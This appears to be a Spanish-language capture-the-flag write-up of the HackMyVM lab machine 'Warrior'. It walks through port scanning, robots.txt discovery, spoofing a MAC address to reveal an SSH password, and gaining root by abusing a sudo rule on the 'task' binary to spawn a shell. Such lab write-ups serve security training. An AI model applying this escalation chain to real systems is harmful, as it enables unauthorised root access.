---
layout      : post
title       : "Warrior - HackMyVm"
author      : elc4br4
image       : assets/images/HMV/Warrior-HackMyVM/portada.png
category    : [ HackMyVM ]
tags        : [ Linux ]
---

Warrior es una máquina de nivel fácil de la plataforma HackMyVm en la que tendremos una explotación diferente a lo que estamos acostumbrados y una escalada a través de un binario SUID

# Escaneo de Puertos

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
| http-robots.txt: 7 disallowed entries 
| /admin /secret.txt /uploads/id_rsa /internal.php 
|_/internal /cms /user.txt
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Como vemos tenemos un robots.txt

Abro el navegador y comienzo a explorar el servidor web y sus rutas

Una vez accedo a la ip encuentro lo siguiente:


![](/assets/images/HMV/Warrior-HackMyVM/warrior.png)


Si revisamos el archivo robots.txt encontramos varias rutas

```bash
Disallow:/admin
Disallow:/secret.txt
Disallow:/uploads/id_rsa
Disallow:/internal.php
Disallow:/internal
Disallow:/cms
Disallow:/user.txt
```

Voy accediendo una a una a todas las rutas, algunas me devuelven el error 404 y 403.

Excepto las rutas /user.txt … /secret.txt … /internal.php

En la ruta */user.txt* encontramos la palabra *loco* que podría ser un usuario del sistema.

En la ruta */secret.txt* encontramos algo más curioso

`0123456789ABCDEF`

Estas letras y números podrían servirnos posteriormente.

Finalmente reviso la ruta */internal.php* y me encuentro con lo siguiente.

![](/assets/images/HMV/Warrior-HackMyVM/internal.png)

Y tenemos otro posible usuario, *bro*

Además de eso nos dice que debemos cambiar la MAC interna como nos muestra *00:00:00:00:00:a?*

Pero nos falta una caracter al final de la dirección MAC, aqui es donde entra en juego el archivo secret.txt

Fui probando una a una hasta que di con la dirección correcta.

![](/assets/images/HMV/Warrior-HackMyVM/mac.png)

Una vez cambiada la dirección fisica de nuestra máquina atacante volvemos a acceder a la ruta /internal.php y encontramos una contraseña.

`Good!!!!!<!-- Your password is: Zurviv0r1 -->`

Ahora podemos acceder por ssh usando uno de los usuarios encontrados y la contraseña.

```bash
❯ ssh bro@192.168.0.31
The authenticity of host '192.168.0.31 (192.168.0.31)' can't be established.
ECDSA key fingerprint is SHA256:EHC+cRjEjv6OiTStHF158ViuvMIv/FYjdAKpF4L0tkY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.31' (ECDSA) to the list of known hosts.
bro@192.168.0.31's password: 
Linux warrior 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb  8 04:03:20 2022 from 192.168.1.51

bro@warrior:~$ id
uid=1000(bro) gid=1000(bro) groups=1000(bro),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

# ESCALADA DE PRIVILEGIOS

Ejecuto `sudo -l` para comprobar si podemos ejecutar algun binario como root sin contraseña.

Si usamos directamente `sudo -l` nos arroja un mensaje de que el comando no se ha encontrado asique pruebo con la ruta completa de sudo.

```bash
bro@warrior:~$ /usr/sbin/sudo -l
Matching Defaults entries for bro on warrior:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser bro may run the following commands on warrior:
    (root) NOPASSWD: /usr/bin/task
```

Podemos ejecutar el binario task como root sin contraseña asique me dirijo a la web de GTFOBINS.


![](/assets/images/HMV/Warrior-HackMyVM/suid.png)

```bash
bro@warrior:~$ /usr/sbin/sudo /usr/bin/task execute /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

Un CTF un poco diferente pero brutal como siempre creado por SML.
